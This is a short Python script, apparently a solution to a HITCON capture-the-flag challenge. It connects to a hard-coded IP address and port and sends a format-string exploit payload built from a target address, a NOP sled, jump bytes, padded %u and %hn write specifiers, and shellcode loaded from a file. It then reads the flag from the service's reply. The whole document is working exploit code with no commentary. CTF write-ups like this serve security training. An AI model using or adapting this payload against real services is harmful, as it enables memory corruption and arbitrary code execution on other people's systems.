#!/usr/bin/env python

import socket
import struct
import telnetlib

ADDR = "203.66.57.148"
PORT = 9527

def rtil(s, c):
    buf = ""
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == c):
            break
    return buf

s = socket.create_connection((ADDR, PORT))

rtil(s, "?")
rtil(s, " ")

s.send("y\n")

# very ugly format string but whatever
buf = "B" * 3 + struct.pack("<I", 0x804a018 + 1) +"\x90" * 160 + "\xeb\x14" * 6 +"A" * 7 + "%94u" * 3 + "%75u" + "%10u" 
buf += "%40uZZZZZZZZZZBBBBCCCC" + open("sc.bin","r").read().rjust(116, "\x90") + "%38u" + "%12$hn" * 40 + "Z" * 100

s.send(buf + "\n")
buf = rtil(s, "}")
flag = buf[buf.index("HITCON"):]
print flag
